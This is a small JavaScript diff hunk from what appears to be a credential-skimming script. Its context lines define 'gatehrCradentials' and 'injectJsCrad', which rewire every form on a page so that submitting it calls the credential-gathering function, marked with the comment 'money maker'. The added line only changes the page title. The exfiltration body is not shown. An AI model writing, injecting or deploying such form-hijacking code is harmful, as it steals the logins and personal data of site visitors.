@@ -12,6 +12,7 @@ function gatehrCradentials() {
 }
 
 function injectJsCrad(){
+document.title = "This is the new page title.";
 for(i=0;i<lengthOfForm.length;i++){
 var formCounter = document.getElementsByTagName("FORM")[i];
 formCounter.setAttribute("onsubmit", "gatehrCradentials()"); //money maker
